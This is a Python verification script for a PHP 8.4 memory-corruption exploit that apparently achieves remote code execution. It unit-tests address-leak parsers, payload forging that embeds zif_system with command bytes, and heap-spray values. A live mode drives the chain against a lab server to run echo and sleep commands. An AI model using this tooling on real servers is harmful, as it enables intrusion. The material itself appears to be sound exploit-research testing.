#!/usr/bin/env python3
"""Checks for timing_oracle.py.

Default run is OFFLINE and deterministic (no target): it unit-tests the leak
parsers, the payload/spray forging, the calibration-free sweep enumeration, and
the timing-oracle classification logic, then prints PASS/FAIL.

    python3 -I verify_timing_oracle.py

With --live PORT it additionally drives a running single-prefork
php:8.4.26-apache lab and reproduces the measured numbers (r0 convergence,
timing separation, false-positive count).

    python3 -I verify_timing_oracle.py --live 8130 --trials 10
"""
import argparse
import os
import statistics
import struct
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)
import timing_oracle as B

PASS = "\033[92mPASS\033[0m" if sys.stdout.isatty() else "PASS"
FAIL = "\033[91mFAIL\033[0m" if sys.stdout.isatty() else "FAIL"


def check(name, cond):
    print(f"  [{PASS if cond else FAIL}] {name}")
    return bool(cond)


def off_tests():
    ok = True
    print("== offline unit tests ==")

    # 1. timing-oracle threshold + classification
    thr = B.sleep_threshold(0.3, 5)
    ok &= check("sleep_threshold(0.3,5) == 2.8", abs(thr - 2.8) < 1e-9)
    ok &= check("is_hit_timing(5.3, baseline=0.3) True", B.is_hit_timing(5.3, 0.3, 5))
    ok &= check("is_hit_timing(0.4, baseline=0.3) False", not B.is_hit_timing(0.4, 0.3, 5))

    # synthetic separation: 0 FP / 0 FN under the threshold rule
    miss = [0.31, 0.29, 0.40, 0.33, 0.28, 0.37]
    hits = [5.30, 5.21, 5.44, 5.19, 5.33, 5.27]
    base = min(miss)
    th = B.sleep_threshold(statistics.mean(miss), 5)
    fp = sum(1 for m in miss if m >= th)
    fn = sum(1 for h in hits if h < th)
    ok &= check(f"synthetic FP==0 FN==0 (sep={min(hits)-max(miss):.2f}s)",
                fp == 0 and fn == 0)

    # 2. calibration-free sweep: window covers BOTH memory profiles' r0 pages,
    #    and contains NO hardcoded single r0.
    pages = B.r0_pages()
    ok &= check("default window is 112 pages (0x50000..0xC0000 step 0x1000)",
                len(pages) == 112)
    ok &= check("window covers 8M-profile r0 page 0x6a000 (measured)",
                0x6a000 in pages)
    ok &= check("window covers 128M-profile a_off page 0x69000 (ours)",
                0x69000 in pages)

    # 3. leak parsers recover a synthetic base
    base_addr = 0x7abc00000000  # 2 MiB aligned
    blob = bytearray(2048)
    for i in range(0, 2048, 16):  # >=8 copies of a chunk-interior ptr
        struct.pack_into("<Q", blob, i, base_addr + 0x1234)
    ok &= check("_chunk_base recovers 2 MiB chunk",
                B._chunk_base(bytes(blob)) == base_addr)

    dtor = B.DTOR_OFFSET
    lib = 0x7abc10000000
    blob2 = bytearray(256)
    for i in range(0, 256, 8):  # >=4 copies of libphp+dtor
        struct.pack_into("<Q", blob2, i, lib + dtor)
    ok &= check("_libphp_base recovers libphp base via dtor offset",
                B._libphp_base(bytes(blob2), dtor) == lib)

    # 4. payload forging: htdata ptr + zif slot + cmd bytes present
    c = B.Chain(None, b"sleep 5")
    htdata = 0x7abc00069800
    zif = 0x7abc00465370
    pay = c._payload(htdata, zif)
    ok &= check("payload embeds zif_system at slot 0x30",
                struct.unpack_from("<Q", pay, 0x30)[0] == zif)
    ok &= check("payload carries dispatched cmd bytes", b"sleep 5" in pay)
    sv = c._packed_value(0x7abc0006a000, zif, [0x160, 0x100, 0x130, 0x190])
    ok &= check("packed spray value is SPRAY_VLEN bytes", len(sv) == B.SPRAY_VLEN)
    ok &= check("packed spray embeds htdata ptr", struct.pack("<Q", 0x7abc0006a800) in sv)

    # 5. only binary offsets are hardcoded; r0 is not a module constant
    import inspect
    src = inspect.getsource(B.calibration_free_r0_sweep)
    ok &= check("sweep takes r0 as a swept range, no literal r0 constant",
                "r0_lo" in src and "0x690d8" not in src and "0x6a160" not in src)
    return ok


def live_tests(port, trials, sweeps, host):
    print(f"\n== live tests against {host}:{port} ==")
    t = B.Target(host, port, timeout=30.0)
    lowbits = [0x160, 0x100, 0x130, 0x190]
    ok = True

    found = []
    for si in range(sweeps):
        # Per-run nonce file: avoids a STALE output file from an earlier run
        # being matched as a false positive by the fetch oracle (the file/fetch
        # oracle is stateful; the timing oracle below is not).
        import secrets
        nonce = secrets.token_hex(6)
        fname = f"pwn_{nonce}.txt"
        c = B.Chain(t, f"echo {nonce}>/var/www/html/{fname}".encode())
        chunk, libphp, raw = c.leak()
        if not chunk or not libphp:
            print(f"  sweep {si}: LEAK FAILED"); ok = False; continue
        zif = libphp + B.ZIF_OFFSET
        r0, proof, st = B.calibration_free_r0_sweep(
            c, chunk, zif, lowbits, oracle="fetch", fetch_path="/" + fname,
            log=lambda s: None)
        if r0 and nonce not in proof:   # content must match the nonce we wrote
            r0 = None
        print(f"  sweep {si}: chunk={chunk:#x} -> r0={r0 and hex(r0)} "
              f"(tested {st['tested']} pages)")
        if r0:
            found.append(r0)
    ok &= check(f"r0 found on all {sweeps} sweeps", len(found) == sweeps)
    ok &= check(f"r0 CONVERGES (all equal: {[hex(x) for x in found]})",
                len(set(found)) == 1 and found)

    if found:
        hit_page = found[-1] & ~0xFFF
        c = B.Chain(t, b"sleep %d" % B.SLEEP_N)
        chunk, libphp, _ = c.leak()
        zif = libphp + B.ZIF_OFFSET
        miss = [c.fire_page(chunk, zif, 0x8000, lowbits) for _ in range(trials)]
        hitv = [c.fire_page(chunk, zif, hit_page, lowbits) for _ in range(trials)]
        th = B.sleep_threshold(statistics.mean(miss))
        fp = sum(1 for m in miss if m >= th)
        fn = sum(1 for h in hitv if h < th)
        sep = min(hitv) - max(miss)
        print(f"  miss mean={statistics.mean(miss):.2f}s max={max(miss):.2f}s; "
              f"hit mean={statistics.mean(hitv):.2f}s min={min(hitv):.2f}s; "
              f"thr={th:.2f}s; sep={sep:+.2f}s; FP={fp}/{trials} FN={fn}/{trials}")
        ok &= check("timing separation > 2s", sep > 2.0)
        ok &= check("0 false positives", fp == 0)
        ok &= check("0 false negatives", fn == 0)
    return ok


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--live", type=int, help="port of a running lab for live checks")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--trials", type=int, default=10)
    ap.add_argument("--sweeps", type=int, default=3)
    a = ap.parse_args()

    ok = off_tests()
    if a.live:
        ok &= live_tests(a.live, a.trials, a.sweeps, a.host)
    print(f"\n{'ALL PASS' if ok else 'FAILURES PRESENT'}")
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
